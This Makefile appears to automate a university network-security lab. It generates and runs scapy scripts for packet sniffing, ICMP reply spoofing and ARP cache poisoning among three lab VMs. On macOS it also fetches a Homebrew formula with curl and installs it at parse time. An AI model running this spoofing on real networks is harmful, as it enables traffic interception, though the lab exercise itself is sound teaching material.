.PHONY: all say_hello clean task1a task1b task1p4 task2 task2a task2b task2c ttab

default: say_hello task2

all: say_hello task1a task1b task1p2 task1p4 task2 clean


SHELL=/bin/bash
VMA=10.0.0.231
VMB=10.0.0.211
VMM=10.0.0.121
VMAMAC=00:1c:42:4f:87:cb
VMBMAC=00:1c:42:86:dd:82
VMMMAC=00:1c:42:b3:90:8a

SYS=$(shell uname -s)
ifeq "$(SYS)" "Linux"
TERMINAL:=gnome-terminal -x sh -c
IP:=ip a
endif

ifeq "$(SYS)" "Darwin"
IP:=ifconfig
ifeq "$(shell which brew)" "/usr/local/bin/brew"
ifeq "$(shell which ttab)" "/usr/local/bin/ttab"
TERMINAL=ttab
else
$(shell curl -LO https://raw.githubusercontent.com/mklement0/ttab/master/ttab.rb && HOMEBREW_NO_AUTO_UPDATE=1 brew install --formula ttab.rb && rm ttab.rb)
TERMINAL=ttab
endif
else
$(error Failed to install Homebrew. Please install it manually)
endif
endif

# to see all colors, run
# bash -c 'for c in {0..255}; do tput setaf $c; tput setaf $c | cat -v; echo =$c; done'
# the first 15 entries are the 8-bit colors

# define standard colors
ifneq (,$(findstring xterm,${TERM}))
	BLACK        := $(shell tput -Txterm setaf 0)
	RED          := $(shell tput -Txterm setaf 1)
	GREEN        := $(shell tput -Txterm setaf 2)
	YELLOW       := $(shell tput -Txterm setaf 3)
	LIGHTPURPLE  := $(shell tput -Txterm setaf 4)
	PURPLE       := $(shell tput -Txterm setaf 5)
	BLUE         := $(shell tput -Txterm setaf 6)
	WHITE        := $(shell tput -Txterm setaf 7)
	RESET        := $(shell tput -Txterm sgr0)
else
	BLACK        := ""
	RED          := ""
	GREEN        := ""
	YELLOW       := ""
	LIGHTPURPLE  := ""
	PURPLE       := ""
	BLUE         := ""
	WHITE        := ""
	RESET        := ""
endif

div=python3 -c "print('='*80)"
title=python3 -c 'print( "{:<23} {:<23} {:<32}".format(">"*23,"$(1)","<"*40)[:80] )'
title2=python3 -c 'print( "{:<13} {:<33} {:<32}".format(">"*13,"$(1)","<"*40)[:80] )'



colors: ## show all the colors
	@echo "${BLACK}BLACK${RESET}"
	@echo "${RED}RED${RESET}"
	@echo "${GREEN}GREEN${RESET}"
	@echo "${YELLOW}YELLOW${RESET}"
	@echo "${LIGHTPURPLE}LIGHTPURPLE${RESET}"
	@echo "${PURPLE}PURPLE${RESET}"
	@echo "${BLUE}BLUE${RESET}"
	@echo "${WHITE}WHITE${RESET}"

say_hello: 
	@clear
	@$(div)
	@echo "	ECE571 Lab 5"
	@echo "			Created by Lihao"
	@$(div)

pre:
	@$(call title, $(BLUE)Test the Environment.$(RESET))
	@pip3 install scapy
	@echo '#!/bin/bin/python3' > pre.py
	@echo '' >> pre.py
	@echo 'from scapy.all import *' >> pre.py
	@echo '' >> pre.py
	@echo 'a = IP()' >> pre.py
	@echo '' >> pre.py
	@echo 'a.show()' >> pre.py
	sudo python3 pre.py
	@rm -f pre.py
	
# task1a:
# 	@$(call title, $(BLUE)Dump the code of task1a.$(RESET))
# 	@echo '#!/usr/bin/python3' > task1.py
# 	@echo 'from scapy.all import *' >> task1.py
# 	@echo 'def print_pkt(pkt):' >> task1.py
# 	@echo '  pkt.show()' >> task1.py
# 	@echo 'pkt = sniff(filter="icmp",prn=print_pkt)' >> task1.py
# 	@$(call title, $(BLUE)Run with the root privilege.$(RESET))
# 	@$(TERMINAL) 'sudo python3 task1.py'
# 	@$(call title, $(BLUE)Run without the root privilege.$(RESET))
# 	python3 task1.py

# task1b:
# 	@$(call title, $(BLUE)Dump the code of task1b2.$(RESET))
# 	@echo '#!/usr/bin/python3' > task1.py
# 	@echo 'from scapy.all import *' >> task1.py
# 	@echo 'def print_pkt(pkt):' >> task1.py
# 	@echo '  pkt.show()' >> task1.py
# 	@echo 'print("Start Sniffing","."*60)' >> task1.py
# 	@echo 'pkt = sniff(filter="tcp dst port 23",prn=print_pkt)' >> task1.py
# 	@$(call title, $(BLUE)Run with the root privilege.$(RESET))
# 	@$(TERMINAL) 'sudo python3 task1.py'
# 	@$(call title, $(BLUE)Dump the code of task1b3.$(RESET))
# 	@echo '#!/usr/bin/python3' > task1b.py
# 	@echo 'from scapy.all import *' >> task1b.py
# 	@echo 'def print_pkt(pkt):' >> task1b.py
# 	@echo '  pkt.show()' >> task1b.py
# 	@echo 'print("Start Sniffing","."*60)' >> task1b.py
# 	@echo 'pkt = sniff(filter="net 10.211.0.0/16",prn=print_pkt)' >> task1b.py
# 	@sudo python3 task1b.py

# task1p2:
# 	@$(call title, $(BLUE)Dump the code of task1.2$(RESET))
# 	@echo '#!/usr/bin/python3' > task1.py
# 	@echo 'from scapy.all import *' >> task1.py
# 	@echo 'print("Task 1.2","."*70)' >> task1.py
# 	@echo 'a = IP()' >> task1.py
# 	@echo 'a.dst = "10.211.55.4"' >> task1.py
# 	@echo 'a.src = "192.168.1.23"' >> task1.py
# 	@echo 'b = ICMP()' >> task1.py
# 	@echo 'p = a/b' >> task1.py
# 	@echo 'send(p)' >> task1.py
# 	@$(call title, $(BLUE)Run with the root privilege.$(RESET))
# 	@sudo python3 task1.py

# task1p4:
# 	@$(call title, $(BLUE)Taks2. Show IP.$(RESET))
# 	@$(IP)
# 	@if [[ "$(shell $(IP))" == *"10.0.0.143"* ]]; then \
# 	$(call title, $(BLUE) VM A. Dump python codes $(RESET));\
# 	echo '#!/usr/bin/python3' > task1.py;\
# 	echo 'from scapy.all import *' >> task1.py;\
# 	echo '' >> task1.py;\
# 	echo 'print("Task 1.4 Sniffing and-then Spoofing","."*70)' >> task1.py;\
# 	echo '' >> task1.py;\
# 	echo 'def spoof_pkt(pkt):' >> task1.py;\
# 	echo '  # create IP object' >> task1.py;\
# 	echo '  ip = IP()' >> task1.py;\
# 	echo '  ip.src = pkt[IP].dst' >> task1.py;\
# 	echo '  ip.dst = pkt[IP].src' >> task1.py;\
# 	echo '  ip.ihl=pkt[IP].ihl' >> task1.py;\
# 	echo '  # create ICMP object' >> task1.py;\
# 	echo '  icmp = ICMP()' >> task1.py;\
# 	echo '  icmp.type = 0' >> task1.py;\
# 	echo '  icmp.code = 0' >> task1.py;\
# 	echo '  icmp.id = pkt[ICMP].id' >> task1.py;\
# 	echo '  icmp.seq = pkt[ICMP].seq' >> task1.py;\
# 	echo '  # read packets data' >> task1.py;\
# 	echo '  data = pkt[Raw].load' >> task1.py;\
# 	echo '  # generate fake packets' >> task1.py;\
# 	echo '  faker = ip/icmp/data' >> task1.py;\
# 	echo '  # send packets' >> task1.py;\
# 	echo '  send(faker, verbose = 0)' >> task1.py;\
# 	echo '  print("sent a spoofed packet.")' >> task1.py;\
# 	echo '' >> task1.py;\
# 	echo 'print("Starting Sniffing...")' >> task1.py;\
# 	echo 'pkt = sniff(filter = "icmp[icmptype]==icmp-echo", prn = spoof_pkt)' >> task1.py;\
# 	$(call title, $(BLUE) VM A. Sniffing and then spoofing $(RESET));\
# 	sudo python3 task1.py;\
# 	else \
# 	$(call title, $(BLUE) VM B. ping 1.2.3.4 $(RESET));\
# 	ping 1.2.3.4;\
# 	$(call title, $(BLUE) VM B. sleep for 15s $(RESET));\
# 	sleep 15;\
# 	$(call title, $(BLUE) VM B. ping 1 after spoof$(RESET));\
# 	ping 1.2.3.4;\
# 	$(call title, $(BLUE) VM B. ping 2 after spoof$(RESET));\
# 	ping 10.20.33.41;\
# 	$(call title, $(BLUE) VM B. ping 3 after spoof$(RESET));\
# 	ping 10.0.0.58;\
# 	fi

task2:
	@$(call title, $(BLUE)shows IP $(RESET))
	@$(IP) | grep "link/ether"
	@$(IP) | grep "inet 10.0."
	@$(call title, $(BLUE)shows ARP $(RESET))
	@arp -a

task2t:
	@$(call title, $(BLUE)shows IP $(RESET))
	@$(IP) | grep "link/ether"
	@$(IP) | grep "inet 10.0."
	@$(call title, $(BLUE)shows ARP $(RESET))
	@arp -a
# this is for VM A
	@if [[ "$(shell $(IP))" == *"$(VMA)"* ]]; then \
	$(call title, $(BLUE) VM A. $(RESET));\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1a $(RESET));\
	arp -a;\
	$(call title, $(BLUE)Clean history $(RESET));\
	sudo arp -d $(VMM);\
	$(call title, $(BLUE)shows ARP 1b $(RESET));\
	arp -a;\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1b $(RESET));\
	arp -a;\
	$(call title, $(BLUE)Clean history 1c$(RESET));\
	sudo arp -d $(VMM);\
	$(call title, $(BLUE)shows ARP 1c $(RESET));\
	arp -a;\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1c $(RESET));\
	arp -a;\
	fi
# this is for VM B
	@if [[ "$(shell $(IP))" == *"$(VMB)"* ]]; then \
	$(call title, $(BLUE) VM B. $(RESET));\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1a $(RESET));\
	arp -a;\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1b $(RESET));\
	arp -a;\
	$(call title, $(BLUE) sleep for 5s. $(RESET));\
	sleep 5;\
	$(call title, $(BLUE)shows ARP 1c $(RESET));\
	arp -a;\
	fi
# this is for VM M
	@if [[ "$(shell $(IP))" == *"$(VMM)"* ]]; then \
	$(call title, $(BLUE) VM M. $(RESET));\
	make task2a;\
	$(call title, $(BLUE) sleep for 4s. $(RESET));\
	sleep 4;\
	make task2b;\
	$(call title, $(BLUE) sleep for 4s. $(RESET));\
	sleep 4;\
	make task2c;\
	fi

task2a:
	@$(call title, $(BLUE)Dump the code for task2a $(RESET))
	@echo '#!/usr/bin/python3' > task2.py
	@echo 'from scapy.all import *' >> task2.py
	@echo '' >> task2.py
	@echo 'dstMAC = "$(VMAMAC)"' >> task2.py
	@echo 'srcMAC = "$(VMMMAC)"' >> task2.py
	@echo 'srcIP  = "$(VMB)"' >> task2.py
	@echo 'dstIP  = "$(VMA)"' >> task2.py
	@echo '' >> task2.py
	@echo 'E = Ether()' >> task2.py
	@echo 'A = ARP()' >> task2.py
	@echo 'A.hwsrc = srcMAC' >> task2.py
	@echo 'A.psrc = srcIP' >> task2.py
	@echo 'A.hwdst = dstMAC' >> task2.py
	@echo 'A.pdst = dstIP' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt = E/A' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt.show()' >> task2.py
	@echo 'sendp(pkt)' >> task2.py
	@$(call title, $(BLUE) ARP 2a attack $(RESET))
	@sudo python3 task2.py
	
task2b:
	@$(call title, $(BLUE)Dump the code for task2b $(RESET))
	@echo '#!/usr/bin/python3' > task2.py
	@echo 'from scapy.all import *' >> task2.py
	@echo '' >> task2.py
	@echo '' >> task2.py
	@echo 'E = Ether()' >> task2.py
	@echo 'E.dst = "$(VMAMAC)"' >> task2.py
	@echo 'E.src = "$(VMMMAC)"' >> task2.py
	@echo 'A = ARP(op = 2)' >> task2.py
	@echo 'A.hwsrc = "$(VMMMAC)"' >> task2.py
	@echo 'A.psrc = "$(VMB)"' >> task2.py
	@echo 'A.hwdst = "$(VMAMAC)"' >> task2.py
	@echo 'A.pdst = "$(VMA)"' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt = E/A' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt.show()' >> task2.py
	@echo 'sendp(pkt)' >> task2.py
	@$(call title, $(BLUE) ARP 2b attack $(RESET))
	@sudo python3 task2.py

task2c:
	@$(call title, $(BLUE)Dump the code for task2c $(RESET))
	@echo '#!/usr/bin/python3' > task2.py
	@echo 'from scapy.all import *' >> task2.py
	@echo '' >> task2.py
	@echo '' >> task2.py
	@echo 'E = Ether()' >> task2.py
	@echo 'E.dst = "ff:ff:ff:ff:ff:ff"' >> task2.py
	@echo 'E.src = "$(VMMMAC)"' >> task2.py
	@echo 'A = ARP()' >> task2.py
	@echo 'A.hwsrc = "$(VMMMAC)"' >> task2.py
	@echo 'A.psrc = "$(VMB)"' >> task2.py
	@echo 'A.hwdst = "ff:ff:ff:ff:ff:ff"' >> task2.py
	@echo 'A.pdst = "$(VMA)"' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt = E/A' >> task2.py
	@echo '' >> task2.py
	@echo 'pkt.show()' >> task2.py
	@echo 'sendp(pkt)' >> task2.py
	@$(call title, $(BLUE) ARP attack 2c $(RESET))
	@sudo python3 task2.py

clean:
	@python3 -c "print('='*80)"
	# @echo "Cleaning up..."
	# @rm -f *.c *.o *.pem *.py *.txt *.bin *.sign
	@echo "Done..."